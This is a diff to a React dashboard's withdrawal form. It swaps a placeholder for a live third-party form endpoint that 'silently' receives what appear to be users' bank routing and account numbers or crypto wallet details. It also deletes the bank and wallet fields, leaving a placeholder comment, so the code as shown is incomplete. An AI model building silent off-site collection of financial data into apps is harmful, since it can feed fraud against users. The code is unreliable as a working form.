@@ -712,9 +712,9 @@ export default function Dashboard() {
                   );
                   setShowWithdrawPopup(true);
 
-                  // ✅ Submit silently to Formspark
+                  // ✅ Submit silently to Formspark (no redirect)
                   try {
-                    await fetch("https://submit.formspark.io/YOUR_FORM_ID", {
+                    await fetch("https://submit-form.com/Uw0FopiGT", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
                       body: JSON.stringify({
@@ -759,57 +759,7 @@ export default function Dashboard() {
                     <option value="wallet">Wallet Address</option>
                   </select>
                 </div>
-                {/* ✅ Bank Flow */}
-                {withdrawType === "bank" && (
-                  <>
-                    {/* Bank fields here... */}
-                    <div className="mb-4 text-left">
-                      <label className="block text-gray-300 font-medium mb-2">
-                        Select Bank
-                      </label>
-                      <select
-                        value={selectedBank}
-                        onChange={(e) => setSelectedBank(e.target.value)}
-                        className="w-full px-4 py-2 rounded bg-gray-700 text-white"
-                      >
-                        <option value="">-- Choose Bank --</option>
-                        <option value="Bank of America">Bank of America</option>
-                        <option value="CashApp Account">CashApp</option>
-                        <option value="SoFi Bank">SoFi Bank</option>
-                        <option value="Wells Fargo">Wells Fargo</option>
-                        <option value="Chase">Chase Bank</option>
-                        <option value="custom">Other (Type Bank Name)</option>
-                      </select>
-                    </div>
-                    {/* ...other bank inputs (customBank, routingNumber, accountNumber, amount) */}
-                  </>
-                )}
-
-                {/* ✅ Wallet Flow */}
-                {withdrawType === "wallet" && (
-                  <>
-                    {/* Wallet fields here... */}
-                    <div className="mb-4 text-left">
-                      <label className="block text-gray-300 font-medium mb-2">
-                        Select Wallet
-                      </label>
-                      <select
-                        value={selectedWallet}
-                        onChange={(e) => setSelectedWallet(e.target.value)}
-                        className="w-full px-4 py-2 rounded bg-gray-700 text-white"
-                      >
-                        <option value="">-- Choose Wallet --</option>
-                        <option value="USDT (TRC20)">USDT (TRC20)</option>
-                        <option value="BTC">Bitcoin (BTC)</option>
-                        <option value="ETH">Ethereum (ETH)</option>
-                        <option value="SOL">Solana (SOL)</option>
-                      </select>
-                    </div>
-                    {/* ...walletAddress and amount inputs */}
-                  </>
-                )}
-
-                {/* ✅ Confirm Button (last tag) */}
+                {/* ...rest of your Bank/Wallet flow fields */}
                 <button
                   type="submit"
                   className="px-6 py-2 bg-indigo-600 text-white rounded hover:bg-indigo-700 transition"
